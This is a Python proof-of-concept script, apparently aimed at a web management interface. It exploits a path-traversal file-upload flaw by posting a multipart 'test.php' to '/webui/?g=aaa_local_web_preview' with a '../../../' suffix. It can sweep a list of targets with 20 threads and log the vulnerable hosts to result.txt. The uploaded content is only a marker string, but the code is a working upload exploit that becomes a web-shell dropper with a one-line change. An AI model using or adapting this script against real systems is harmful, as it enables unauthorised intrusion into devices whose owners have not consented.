import requests,argparse,sys,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
    "Content-Type": "multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a",
    "Accept-Encoding": "gzip",
    "Content-Length": "196",
    }   
def poc(url):
    payload = '/webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../test.php'
    target = url+payload
    data = ''.join((
    "--849978f98abe41119122148e4aa65b1a",
    "\r\n",
    'Content-Disposition: form-data; name="123"; filename="test.php"',
    "\r\n",
    "Content-Type: text/plain",
    "\r\n\r\n",
    "This page has a vulnerability",
    "\r\n",
    '--849978f98abe41119122148e4aa65b1a--',
    ))
    try:
        rsp = requests.get(url=url,verify=False)
        if rsp.status_code == 200:
            rsp2 = requests.post(url=target,headers=headers,data=data,verify=False)
            if 'success'in rsp2.text and 'msg' in rsp2.text:
                print(f"[+]{url}存在文件上传漏洞")
                with open('./result.txt','a',encoding="utf-8") as f:
                    f.write(url+'\n')
            else:
                print(f"[-]{url}不存在文件上传漏洞")
        else:
            print(f"[-]{url}不存在文件上传漏洞")
    except Exception as e:
        print("该站点有问题")
        return False
def main():
    par = argparse.ArgumentParser()
    par.add_argument('-u','--url',dest='url',type=str,help='http://www.qqqq.com')
    par.add_argument('-f','--file',dest='file',type=str,help='target.txt')
    args = par.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and  args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(20)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
if __name__ == '__main__':
    main()